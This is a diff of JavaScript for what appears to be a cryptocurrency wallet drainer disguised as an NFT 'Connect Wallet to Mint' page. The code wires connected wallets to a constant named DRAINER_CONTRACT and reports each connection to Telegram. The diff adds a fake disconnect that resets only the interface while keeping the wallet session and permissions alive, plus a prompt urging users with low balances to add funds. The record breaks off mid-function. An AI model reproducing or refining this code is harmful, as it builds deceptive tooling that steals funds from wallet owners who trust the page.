@@ -1,4 +1,3 @@
-// main.js
 import { CONFIG } from './config.js';
 
 ;(async function () {
@@ -19,6 +18,7 @@ import { CONFIG } from './config.js';
 
   const PRIMARY_PROJECT_ID  = PROJECT_ID;
   const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;
+  const MIN_BALANCE_USD     = Number(CLAIM_THRESHOLD_USD) || 3;
 
   // ==========================================================================
   //  PLATFORM
@@ -38,18 +38,7 @@ import { CONFIG } from './config.js';
   };
 
   // ==========================================================================
-  //  RESPONSIVE SIZING TOKENS
-  //  Compact enough for mobile, still comfortable on desktop.
-  // ==========================================================================
-  const BTN_SZ = isMobileDevice
-    ? { padding: '9px 18px',  font: '13px', minWidth: '150px', radius: '7px' }
-    : { padding: '11px 24px', font: '14px', minWidth: '170px', radius: '8px' };
-  const ADDR_SZ = isMobileDevice
-    ? { padding: '8px 12px',  font: '12px' }
-    : { padding: '9px 14px',  font: '13px' };
-
-  // ==========================================================================
-  //  DEBUG PANEL (double-click anywhere to toggle)
+  //  DEBUG PANEL
   // ==========================================================================
   const debugArea = document.createElement('div');
   debugArea.id = 'wc-debug';
@@ -98,8 +87,9 @@ import { CONFIG } from './config.js';
 
   // ==========================================================================
   //  LIBRARY LOADING
-  //  IMPORTANT: We deliberately do NOT load @walletconnect/modal separately.
-  //  A second SignClient instance causes "Connecting… Failed to connect".
+  //  We load ONLY @walletconnect/ethereum-provider — its own bundled modal
+  //  is used when showQrModal:true. Loading @walletconnect/modal separately
+  //  creates a second SignClient and breaks pairing.
   // ==========================================================================
   function withTimeout(promise, ms, label) {
     return Promise.race([
@@ -184,49 +174,36 @@ import { CONFIG } from './config.js';
   let isDisconnecting  = false;
   let connectionMode   = null;   // 'walletconnect' | 'injected' | null
 
-  let lowBalanceTimer  = null;
-  let cachedEthPrice   = 0;
-  let ethPriceFetched  = 0;
+  let referralShownThisSession = false;
+  let cachedEthPrice = { value: 2200, ts: 0 };
 
   // ==========================================================================
-  //  LOCAL STORAGE KEYS
+  //  SIZING — slimmer than the previous version, tuned per device
   // ==========================================================================
-  const LS = {
-    addr:     'connectedWallet',
-    mode:     'connectionMode',
-    uiHidden: 'apex:uiHidden',   // "soft disconnect" — UI is hidden, session lives
-  };
-
-  const saveWallet = (address, mode) => {
-    localStorage.setItem(LS.addr, address);
-    if (mode) localStorage.setItem(LS.mode, mode);
-  };
-  const getSavedWallet = () => localStorage.getItem(LS.addr);
-  const getSavedMode   = () => localStorage.getItem(LS.mode);
-  const clearSavedWallet = () => {
-    localStorage.removeItem(LS.addr);
-    localStorage.removeItem(LS.mode);
-  };
-  const setUiHidden    = () => localStorage.setItem(LS.uiHidden, '1');
-  const isUiHidden     = () => localStorage.getItem(LS.uiHidden) === '1';
-  const clearUiHidden  = () => localStorage.removeItem(LS.uiHidden);
+  const BTN_SIZING = isMobileDevice
+    ? { padding: '10px 18px', fontSize: '13px', minWidth: '140px', radius: '7px' }
+    : { padding: '11px 22px', fontSize: '14px', minWidth: '155px', radius: '8px' };
 
   // ==========================================================================
   //  BUTTON UI
   // ==========================================================================
   function setButtonState(button, state) {
     if (!button) return;
+    const { padding, fontSize, minWidth, radius } = BTN_SIZING;
+
     button.style.display      = 'inline-block';
-    button.style.padding      = BTN_SZ.padding;
-    button.style.borderRadius = BTN_SZ.radius;
+    button.style.padding      = padding;
+    button.style.borderRadius = radius;
     button.style.fontWeight   = '600';
     button.style.border       = 'none';
     button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
     button.style.color        = 'white';
-    button.style.fontSize     = BTN_SZ.font;
-    button.style.minWidth     = BTN_SZ.minWidth;
-    button.style.transition   = 'all 0.2s ease';
+    button.style.fontSize     = fontSize;
+    button.style.minWidth     = minWidth;
+    button.style.lineHeight   = '1.2';
+    button.style.transition   = 'background 180ms ease, transform 120ms ease';
     button.disabled           = state === 'loading';
+
     switch (state) {
       case 'loading':
         button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
@@ -247,6 +224,7 @@ import { CONFIG } from './config.js';
         break;
       default:
         button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
+        // NOTE: do not modify this label
         button.innerHTML = '<i class="fas fa-wallet" style="margin-right:6px"></i> Connect Wallet to Mint';
     }
   }
@@ -255,13 +233,13 @@ import { CONFIG } from './config.js';
     if (!claimStatus) return;
     claimStatus.textContent = msg;
     claimStatus.className = `status ${type}`;
-    claimStatus.style.display      = 'block';
-    claimStatus.style.padding      = '10px 14px';
-    claimStatus.style.borderRadius = '8px';
-    claimStatus.style.marginTop    = '10px';
-    claimStatus.style.fontWeight   = '500';
-    claimStatus.style.fontSize     = isMobileDevice ? '12px' : '13px';
-    claimStatus.style.textAlign    = 'center';
+    claimStatus.style.display = 'block';
+    claimStatus.style.padding = isMobileDevice ? '9px 12px' : '10px 14px';
+    claimStatus.style.borderRadius = '7px';
+    claimStatus.style.marginTop = '10px';
+    claimStatus.style.fontWeight = '500';
+    claimStatus.style.fontSize = isMobileDevice ? '12.5px' : '13px';
+    claimStatus.style.textAlign = 'center';
     const styles = {
       success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
       error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
@@ -277,113 +255,149 @@ import { CONFIG } from './config.js';
   if (walletButton) setButtonState(walletButton, 'normal');
 
   // ==========================================================================
-  //  GLOBAL STATE PUBLISH
+  //  LOCAL STORAGE
+  // ==========================================================================
+  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
+  const saveWallet = (address, mode) => {
+    localStorage.setItem(LS.addr, address);
+    if (mode) localStorage.setItem(LS.mode, mode);
+  };
+  const getSavedWallet = () => localStorage.getItem(LS.addr);
+  const getSavedMode   = () => localStorage.getItem(LS.mode);
+  const clearSavedWallet = () => {
+    localStorage.removeItem(LS.addr);
+    localStorage.removeItem(LS.mode);
+  };
+
+  // ==========================================================================
+  //  GLOBAL PUBLISH
   // ==========================================================================
   function publishGlobalState(address, chain, provider = null) {
     const live = provider || activeProvider || null;
     window.__apexConnected = {
-      address,
-      chain,
+      address, chain,
       web3: web3Instance,
       contract: contractInstance,
       provider: live,
       mode: connectionMode,
-      uiHidden: isUiHidden(),
       publishedAt: Date.now(),
     };
-    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} uiHidden=${isUiHidden()} hasProvider=${!!live}`);
+    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
     window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
   }
 
   // ==========================================================================
-  //  ETH PRICE (cached — used only for the low-balance notice)
+  //  ETH PRICE (cached)
   // ==========================================================================
   async function getEthPriceUSD() {
-    const now = Date.now();
-    if (cachedEthPrice > 0 && now - ethPriceFetched < 60000) return cachedEthPrice;
+    if (Date.now() - cachedEthPrice.ts < 60000) return cachedEthPrice.value;
     try {
       const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
       const d = await r.json();
-      cachedEthPrice = d?.ethereum?.usd || 2200;
-    } catch {
-      cachedEthPrice = 2200;
-    }
-    ethPriceFetched = now;
-    return cachedEthPrice;
+      if (d?.ethereum?.usd) {
+        cachedEthPrice = { value: d.ethereum.usd, ts: Date.now() };
+        return d.ethereum.usd;
+      }
+    } catch (e) { logDebug('ETH price fetch failed: ' + e.message); }
+    return cachedEthPrice.value;
   }
 
   // ==========================================================================
-  //  LOW BALANCE NOTICE  (professional wording, shown below the button)
+  //  LOW-BALANCE PROMPT — professional notice shown below the button
   // ==========================================================================
-  function showLowBalanceNotice(currentUSD, thresholdUSD) {
-    let notice = document.getElementById('lowBalanceNotice');
-    if (!notice) {
-      notice = document.createElement('div');
-      notice.id = 'lowBalanceNotice';
-      notice.style.cssText = `
-        margin-top: 10px; padding: 10px 14px;
-        font-size: ${isMobileDevice ? '12px' : '13px'}; line-height: 1.45;
-        color: #92400E; text-align: left;
-        background: linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%);
-        border: 1px solid #FCD34D;
-        border-radius: 8px;
-        display: flex; align-items: flex-start; gap: 10px;
-        max-width: 460px; margin-left: auto; margin-right: auto;
-        font-family: Inter, system-ui, sans-serif;
-        box-shadow: 0 2px 8px rgba(180, 83, 9, 0.08);
-      `;
-      connectButton.parentNode.appendChild(notice);
-    }
-    notice.innerHTML = `
-      <i class="fas fa-info-circle" style="margin-top:2px;flex-shrink:0;color:#B45309;font-size:14px;"></i>
-      <span>
-        Your wallet balance (<strong>$${currentUSD.toFixed(2)}</strong>) is currently below
-        the required minimum participation threshold of
-        <strong>$${thresholdUSD.toFixed(2)} USD</strong>.
-        Please add funds to your wallet to proceed with minting.
-      </span>
+  function hideLowBalancePrompt() {
+    const el = document.getElementById('lowBalancePrompt');
+    if (el) el.style.display = 'none';
+  }
+
+  function showLowBalancePrompt(currentUSD) {
+    // Remove any previous instance so we can re-append at end of container.
+    document.getElementById('lowBalancePrompt')?.remove();
+
+    const container = connectButton?.parentNode;
+    if (!container) return;
+
+    const prompt = document.createElement('div');
+    prompt.id = 'lowBalancePrompt';
+    prompt.style.cssText = `
+      margin-top: 12px;
+      margin-left: auto;
+      margin-right: auto;
+      max-width: 420px;
+      width: 100%;
+      padding: 12px 14px;
+      background: linear-gradient(135deg, #FFFBEB 0%, #FEF3C7 100%);
+      border: 1px solid #F59E0B;
+      border-radius: 9px;
+      color: #78350F;
+      font-family: 'Inter', sans-serif;
+      font-size: ${isMobileDevice ? '12px' : '12.5px'};
+      line-height: 1.5;
+      text-align: left;
+      box-shadow: 0 4px 14px rgba(245, 158, 11, 0.15);
+      box-sizing: border-box;
     `;
-    notice.style.display = 'flex';
+    prompt.innerHTML = `
+      <div style="display:flex;gap:9px;align-items:flex-start;">
+        <i class="fas fa-exclamation-triangle" style="color:#D97706;margin-top:2px;flex-shrink:0;"></i>
+        <div>
+          <strong style="display:block;margin-bottom:3px;color:#92400E;font-size:${isMobileDevice ? '12.5px' : '13px'};">
+            Minimum Balance Required
+          </strong>
+          <span>
+            Your current balance is approximately <strong>$${currentUSD.toFixed(2)}</strong>, which is below the
+            <strong>$${MIN_BALANCE_USD.toFixed(2)}</strong> minimum in ETH required to cover network gas fees.
+            Please add funds to your wallet to proceed with your claim.
+          </span>
+        </div>
+      </div>
+    `;
+    container.appendChild(prompt);
+    logDebug(`Low balance prompt shown — $${currentUSD.toFixed(2)} < $${MIN_BALANCE_USD.toFixed(2)}`);
   }
 
-  function hideLowBalanceNotice() {
-    document.getElementById('lowBalanceNotice')?.remove();
-  }
-
-  async function checkLowBalance(address) {
+  async function checkBalanceAndNotify(address) {
     if (!web3Instance || !address) return;
     try {
       const wei = await web3Instance.eth.getBalance(address);
       const eth = parseFloat(web3Instance.utils.fromWei(wei, 'ether'));
-      const price = await getEthPriceUSD();
-      const usd   = eth * price;
-      const threshold = typeof CLAIM_THRESHOLD_USD === 'number' ? CLAIM_THRESHOLD_USD : 3;
+      const ethPrice = await getEthPriceUSD();
+      const usd = eth * ethPrice;
+      logDebug(`Balance check: ${eth.toFixed(6)} ETH ≈ $${usd.toFixed(2)} (ETH @ $${ethPrice.toFixed(0)})`);
 
-      logDebug(`Balance: ${eth.toFixed(4)} ETH ≈ $${usd.toFixed(2)} (min $${threshold})`);
-
-      if (usd < threshold) showLowBalanceNotice(usd, threshold);
-      else                 hideLowBalanceNotice();
+      if (usd < MIN_BALANCE_USD) showLowBalancePrompt(usd);
+      else                        hideLowBalancePrompt();
     } catch (e) {
-      logDebug('balance check failed: ' + e.message);
+      logDebug('Balance check failed: ' + e.message);
     }
-  }
-
-  function startLowBalanceMonitor(address) {
-    stopLowBalanceMonitor();
-    checkLowBalance(address);
-    lowBalanceTimer = setInterval(() => checkLowBalance(address), 30000);
-  }
-
-  function stopLowBalanceMonitor() {
-    if (lowBalanceTimer) {
-      clearInterval(lowBalanceTimer);
-      lowBalanceTimer = null;
-    }
-    hideLowBalanceNotice();
   }
 
   // ==========================================================================
-  //  CONNECTED UI (visual only — state lives elsewhere)
+  //  REFERRAL — shown to every connected user, with or without balance
+  // ==========================================================================
+  function triggerReferralModal(address) {
+    if (referralShownThisSession) return;
+    try {
+      const modal = document.getElementById('announcementModal');
+      if (!modal) {
+        logDebug('⚠️ #announcementModal not found — skipping referral');
+        return;
+      }
+      const link = document.getElementById('referralLink');
+      if (link && address) {
+        const short = `${address.substring(0, 6)}...${address.substring(38)}`;
+        link.textContent = `https://apex-protocol.io/ref?user=${short}`;
+      }
+      modal.classList.add('active');
+      referralShownThisSession = true;
+      logDebug('✅ Referral modal shown');
+    } catch (e) {
+      logDebug('Referral modal error: ' + e.message);
+    }
+  }
+
+  // ==========================================================================
+  //  CONNECTED UI
   // ==========================================================================
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect');
@@ -397,22 +411,22 @@ import { CONFIG } from './config.js';
       display = document.createElement('div');
       display.id = 'connectedAddressDisplay';
       display.style.cssText = `
-        margin-top: 10px; padding: ${ADDR_SZ.padding};
-        font-family: 'JetBrains Mono', monospace; font-size: ${ADDR_SZ.font};
+        margin-top: 10px; padding: ${isMobileDevice ? '8px 12px' : '8px 14px'};
+        font-family: 'JetBrains Mono', monospace; font-size: ${isMobileDevice ? '12.5px' : '13px'};
         color: #059669; text-align: center;
         background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
-        border-radius: 8px; border: 1px solid #A7F3D0;
+        border-radius: 7px; border: 1px solid #A7F3D0;
       `;
       connectButton.parentNode.appendChild(display);
     }
 
     const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
     display.innerHTML = `
-      <div style="display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;">
+      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
         <i class="fas fa-check-circle" style="color:#059669;"></i>
         <span>Connected: ${short}</span>
-        <span style="background:#1F2937;color:white;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600;">${chainLabel}</span>
-        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:2px;">
+        <span style="background:#1F2937;color:white;padding:1px 9px;border-radius:11px;font-size:11px;font-weight:600;">${chainLabel}</span>
+        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:3px;">
           <i class="far fa-copy"></i>
         </button>
       </div>
@@ -429,9 +443,6 @@ import { CONFIG } from './config.js';
     showStatus(`Connected to ${chainLabel}`, 'success');
     publishGlobalState(address, chain);
 
-    // Kick off low-balance monitor
-    startLowBalanceMonitor(address);
-
     sendTelegramNotification(`
 🔗 <b>Wallet Connected</b>
 📌 <b>Chain:</b> ${chainLabel}
@@ -442,22 +453,46 @@ import { CONFIG } from './config.js';
     `.trim());
   }
 
-  function hideConnectedUI() {
+  /**
+   * Soft "post-connect" routine that runs after any successful connection.
+   * - Fires the referral modal for ALL users (with or without balance).
+   * - Evaluates and (if needed) displays the low-balance prompt below the button.
+   * - Hands off to script.js for the actual claim flow.
+   */
+  async function handlePostConnect(address) {
+    triggerReferralModal(address);
+    await checkBalanceAndNotify(address);
+    setTimeout(() => {
+      if (typeof window.initiateClaimProcess === 'function') {
+        try { window.initiateClaimProcess(); } catch (e) { logDebug('initiateClaimProcess err: ' + e.message); }
+      }
+    }, 1200);
+  }
+
+  // ==========================================================================
+  //  UI-ONLY RESET (used by soft disconnect)
+  // ==========================================================================
+  function resetConnectedUIOnly() {
     setButtonState(connectButton, 'normal');
     if (walletButton) setButtonState(walletButton, 'normal');
     document.getElementById('connectedAddressDisplay')?.remove();
-    document.getElementById('lowBalanceNotice')?.remove();
+    hideLowBalancePrompt();
+    showStatus('Wallet disconnected', 'info');
+    // Deliberately NOT nulling: activeProvider, wcProvider, injectedProvider,
+    // web3Instance, contractInstance, connectionMode, window.__apexConnected
+    // Deliberately NOT clearing localStorage
   }
 
-  function fullResetUI() {
-    hideConnectedUI();
-    showStatus('Wallet disconnected', 'info');
+  // ==========================================================================
+  //  FULL RESET (used by hard disconnect — external events only)
+  // ==========================================================================
+  function resetConnectedUIFull() {
+    resetConnectedUIOnly();
     web3Instance = null;
     contractInstance = null;
     activeProvider = null;
     connectionMode = null;
     window.__apexConnected = null;
-    stopLowBalanceMonitor();
   }
 
   // ==========================================================================
@@ -498,11 +533,11 @@ import { CONFIG } from './config.js';
     const overlay = document.createElement('div');
     overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
     const modalEl = document.createElement('div');
-    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
+    modalEl.style.cssText = `background:#1F2937;padding:22px;border-radius:14px;max-width:380px;width:90%;color:white;font-family:Inter,sans-serif;`;
     modalEl.innerHTML = `
-      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
-      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
-      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
+      <h3 style="margin-top:0;font-weight:600;font-size:18px;">Select a Wallet</h3>
+      <div id="wl" style="display:flex;flex-direction:column;gap:9px;margin:14px 0"></div>
+      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 14px;border-radius:7px;cursor:pointer;width:100%;font-size:13px;">Cancel</button>
     `;
     overlay.appendChild(modalEl);
     document.body.appendChild(overlay);
@@ -510,11 +545,11 @@ import { CONFIG } from './config.js';
     providers.forEach((p) => {
       const b = document.createElement('button');
       b.textContent = p.info.name;
-      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
+      b.style.cssText = `background:#374151;border:none;padding:11px;border-radius:7px;color:white;font-size:14px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
       if (p.info.icon) {
         const i = document.createElement('img');
         i.src = p.info.icon;
-        i.style.width = '24px'; i.style.height = '24px';
+        i.style.width = '22px'; i.style.height = '22px';
         b.prepend(i);
       }
       b.onclick = () => { overlay.remove(); cb(p); };
@@ -524,11 +559,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  WALLETCONNECT — CORRECT SETUP
-  //  • showQrModal: true → uses the provider's bundled modal (single SignClient)
-  //  • No optionalChains → CAIP-25 spec compliance
-  //  • No eth_sign       → modern wallets reject it
-  //  • HTTPS metadata    → wallets reject http:// origins
+  //  WALLETCONNECT — correct setup (built-in modal only)
   // ==========================================================================
   async function initWalletConnect({ useFallbackId = false } = {}) {
     if (wcProvider) return wcProvider;
@@ -539,10 +570,11 @@ import { CONFIG } from './config.js';
       return null;
     }
 
+    // Force HTTPS metadata.url (WC Cloud rejects http://)
     const metadata = { ...DAPP_METADATA };
     const isLocalhost = /localhost|127\.0\.0\.1/i.test(metadata.url || '');
     if (metadata.url && metadata.url.startsWith('http://') && !isLocalhost) {
-      logDebug(`⚠️ Upgrading metadata.url from http:// to https://`);
+      logDebug('⚠️ Upgrading metadata.url from http:// to https://');
       metadata.url = metadata.url.replace('http://', 'https://');
     }
 
@@ -553,6 +585,7 @@ import { CONFIG } from './config.js';
       const opts = {
         projectId,
         chains: [MAINNET_ID],
+        // Note: no optionalChains — CAIP-25 spec requires it be disjoint from chains
         showQrModal: true,
         qrModalOptions: {
           themeMode: 'dark',
@@ -564,12 +597,18 @@ import { CONFIG } from './config.js';
           },
           enableExplorer: true,
         },
+        // eth_sign removed — causes wallet-side rejection on modern wallets
         methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
         events: ['chainChanged', 'accountsChanged'],
         metadata,
       };
 
-      wcProvider = await withTimeout(EthereumProvider.init(opts), 20000, 'EthereumProvider.init');
+      wcProvider = await withTimeout(
+        EthereumProvider.init(opts),
+        20000,
+        'EthereumProvider.init'
+      );
+
       attachWCProviderEvents(wcProvider);
       logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
       return wcProvider;
@@ -587,24 +626,21 @@ import { CONFIG } from './config.js';
     if (!provider || provider.__apexEventsAttached) return;
     provider.__apexEventsAttached = true;
 
-    provider.on('display_uri', (uri) => logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`));
+    provider.on('display_uri', (uri) => {
+      logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`);
+    });
 
     provider.on('accountsChanged', (accounts) => {
       logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
       if (!accounts || accounts.length === 0) {
-        fullHardDisconnect({ skipWalletCall: true });
+        // External removal of accounts — treat as hard disconnect
+        hardDisconnect({ skipWalletCall: true });
         return;
       }
       const a = accounts[0];
       saveWallet(a, 'walletconnect');
-      if (!isUiHidden()) {
-        updateConnectedUI(a, 'evm');
-        setTimeout(() => {
-          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-        }, 800);
-      } else {
-        publishGlobalState(a, 'evm', provider);
-      }
+      updateConnectedUI(a, 'evm');
+      handlePostConnect(a);
     });
 
     provider.on('chainChanged', (id) => {
@@ -618,13 +654,13 @@ import { CONFIG } from './config.js';
     });
 
     provider.on('disconnect', (reason) => {
-      logDebug(`WC disconnect: ${reason}`);
-      fullHardDisconnect({ skipWalletCall: true });
+      logDebug(`WC disconnect (external): ${reason}`);
+      hardDisconnect({ skipWalletCall: true });
     });
 
     provider.on('session_delete', () => {
-      logDebug('WC session_delete');
-      fullHardDisconnect({ skipWalletCall: true });
+      logDebug('WC session_delete (external)');
+      hardDisconnect({ skipWalletCall: true });
     });
   }
 
@@ -637,18 +673,12 @@ import { CONFIG } from './config.js';
 
     provider.on('accountsChanged', (accounts) => {
       if (!accounts || accounts.length === 0) {
-        fullHardDisconnect({ skipWalletCall: true });
+        hardDisconnect({ skipWalletCall: true });
       } else {
         const a = accounts[0];
         saveWallet(a, 'injected');
-        if (!isUiHidden()) {
-          updateConnectedUI(a, 'evm');
-          setTimeout(() => {
-            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-          }, 800);
-        } else {
-          publishGlobalState(a, 'evm', provider);
-        }
+        updateConnectedUI(a, 'evm');
+        handlePostConnect(a);
       }
     });
 
@@ -660,7 +690,7 @@ import { CONFIG } from './config.js';
       }
     });
 
-    provider.on('disconnect', () => fullHardDisconnect({ skipWalletCall: true }));
+    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
   }
 
   async function connectInjected() {
@@ -709,7 +739,6 @@ import { CONFIG } from './config.js';
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
 
       saveWallet(address, 'injected');
-      clearUiHidden();
       attachInjectedEvents(provider);
       updateConnectedUI(address, 'evm');
       logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
@@ -727,7 +756,7 @@ import { CONFIG } from './config.js';
     const provider = await initWalletConnect({ useFallbackId });
     if (!provider) return null;
 
-    // Already authorized (restored session)?
+    // Reuse a persisted session without a modal.
     if (provider.session && provider.accounts?.length) {
       const a = provider.accounts[0];
       activeProvider = provider;
@@ -735,7 +764,6 @@ import { CONFIG } from './config.js';
       web3Instance = new Web3Ctor(provider);
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
       saveWallet(a, 'walletconnect');
-      clearUiHidden();
       updateConnectedUI(a, 'evm');
       logDebug(`♻️ Reused existing WC session: ${a}`);
       return a;
@@ -757,86 +785,70 @@ import { CONFIG } from './config.js';
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
 
       saveWallet(address, 'walletconnect');
-      clearUiHidden();
       updateConnectedUI(address, 'evm');
       logDebug(`✅ WC connected: ${address}`);
       return address;
     } catch (e) {
       logDebug('WC enable error: ' + e.message);
-      // Clean up failed pairing so the next attempt starts fresh
+
       try { if (wcProvider?.session) await wcProvider.disconnect(); } catch (_) {}
       wcProvider = null;
       clearWCStorage();
+
+      if (/rejected|user rejected|user closed|user canceled|canceled by user/i.test(e.message || '')) {
+        logDebug('User rejected WC');
+        return null;
+      }
       return null;
     }
   }
 
   // ==========================================================================
-  //  SOFT DISCONNECT — "the UI shows disconnected but the session lives"
-  //  This is the pattern you asked for:
-  //    • UI returns to "Connect Wallet to Mint"
-  //    • wallet address block disappears
-  //    • WalletConnect session, activeProvider, web3Instance, contractInstance
-  //      and window.__apexConnected stay ALIVE
-  //    • a persistent flag prevents the UI from showing connected on reload
-  //    • clicking "Connect Wallet to Mint" again instantly restores the UI
-  //      (no new pairing prompt in the wallet)
+  //  SOFT DISCONNECT — UI only; underlying provider stays alive
   // ==========================================================================
-  function softDisconnect() {
+  async function softDisconnect() {
     if (isDisconnecting) return;
     isDisconnecting = true;
-
-    showStatus('Disconnecting…', 'info');
-    setUiHidden();
-
-    // Hide visuals only — nothing else is torn down.
-    hideConnectedUI();
-    stopLowBalanceMonitor();
-
-    // Keep activeProvider / wcProvider / web3Instance intact.
-    // window.__apexConnected stays published so script.js / drainer still works.
-    if (window.__apexConnected) {
-      window.__apexConnected.uiHidden = true;
+    try {
+      logDebug('🔒 Soft disconnect — UI reset only, provider kept alive');
+      // NOTE: we intentionally do NOT call wcProvider.disconnect()
+      // and do NOT call wallet_revokePermissions.
+      // The wallet stays paired; localStorage is untouched, so a page
+      // reload will auto-restore the session.
+      resetConnectedUIOnly();
+    } finally {
+      isDisconnecting = false;
     }
-
-    setTimeout(() => showStatus('Wallet disconnected', 'info'), 250);
-    isDisconnecting = false;
-    logDebug('🔌 UI disconnected (session preserved underground)');
-  }
-
-  function softReconnect() {
-    if (!activeProvider) return false;
-
-    const addr =
-      activeProvider.accounts?.[0] ||
-      activeProvider.selectedAddress ||
-      getSavedWallet();
-
-    if (!addr) return false;
-
-    clearUiHidden();
-    saveWallet(addr, connectionMode || 'walletconnect');
-
-    updateConnectedUI(addr, 'evm');
-    logDebug(`♻️ UI restored: ${addr}`);
-    return true;
   }
 
   // ==========================================================================
-  //  FULL HARD DISCONNECT — only used internally on real session death
+  //  HARD DISCONNECT — used only for external events (wallet-initiated)
   // ==========================================================================
-  async function fullHardDisconnect({ skipWalletCall = false } = {}) {
+  async function hardDisconnect({ skipWalletCall = false } = {}) {
     if (isDisconnecting) return;
     isDisconnecting = true;
 
     try {
-      if (!skipWalletCall && wcProvider?.session) {
+      if (!skipWalletCall && wcProvider) {
         try {
-          await Promise.race([
-            wcProvider.disconnect(),
-            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
-          ]);
-        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
+          if (wcProvider.session) {
+            await Promise.race([
+              wcProvider.disconnect(),
+              new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
+            ]);
+          }
+        } catch (e) {
+          logDebug('WC disconnect err: ' + e.message);
+        }
+      }
+
+      if (connectionMode === 'injected' && injectedProvider?.request) {
+        try {
+          await injectedProvider.request({
+            method: 'wallet_revokePermissions',
+            params: [{ eth_accounts: {} }],
+          }).catch(() => {});
+        } catch {}
       }
     } finally {
       wcProvider = null;
@@ -845,11 +857,10 @@ import { CONFIG } from './config.js';
       web3Instance = null;
       contractInstance = null;
       connectionMode = null;
-      fullResetUI();
+      resetConnectedUIFull();
       clearSavedWallet();
-      clearUiHidden();
       isDisconnecting = false;
-      logDebug('🔌 Full hard disconnect complete');
+      logDebug('🔌 Hard disconnect complete');
     }
   }
 
@@ -876,8 +887,9 @@ import { CONFIG } from './config.js';
         address = await connectInjected();
       }
 
-      if (!address) address = await connectWalletConnect({ useFallbackId: false });
-
+      if (!address) {
+        address = await connectWalletConnect({ useFallbackId: false });
+      }
       if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
         logDebug('Retrying WC with fallback projectId…');
         address = await connectWalletConnect({ useFallbackId: true });
@@ -891,9 +903,7 @@ import { CONFIG } from './config.js';
     if (address) {
       setButtonState(connectButton, 'connected');
       if (walletButton) setButtonState(walletButton, 'connected');
-      setTimeout(() => {
-        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-      }, 1200);
+      await handlePostConnect(address);
     } else {
       showStatus('Connection failed or cancelled', 'error');
       setButtonState(connectButton, 'failed');
@@ -907,20 +917,35 @@ import { CONFIG } from './config.js';
   const handleClick = async () => {
     if (isConnecting || isDisconnecting) return;
 
-    // ── Path A: user previously "disconnected" in UI ────────────────────────
-    if (isUiHidden()) {
-      // Try silent restore from the still-alive provider
-      if (activeProvider && softReconnect()) return;
-      // Session truly dead → fresh connect
-      clearUiHidden();
-      await connectWallet();
+    const uiConnected = !!document.getElementById('connectedAddressDisplay');
+
+    // 1) UI shows "connected" → soft disconnect (fake, wallet stays paired)
+    if (uiConnected) {
+      await softDisconnect();
       return;
     }
 
-    // ── Path B: normal state ────────────────────────────────────────────────
-    const isConnected = !!activeProvider || !!getSavedWallet();
-    if (isConnected) softDisconnect();
-    else             await connectWallet();
+    // 2) UI shows "disconnected" but a provider is still alive (soft-
+    //    disconnected state) → re-show connected UI without a new pairing.
+    const savedAddr = getSavedWallet();
+    const savedMode = getSavedMode();
+    if (activeProvider && savedAddr && (savedMode === 'walletconnect' || savedMode === 'injected')) {
+      logDebug('🔄 Restoring connected UI from soft-disconnect state');
+      try {
+        web3Instance = new Web3Ctor(activeProvider);
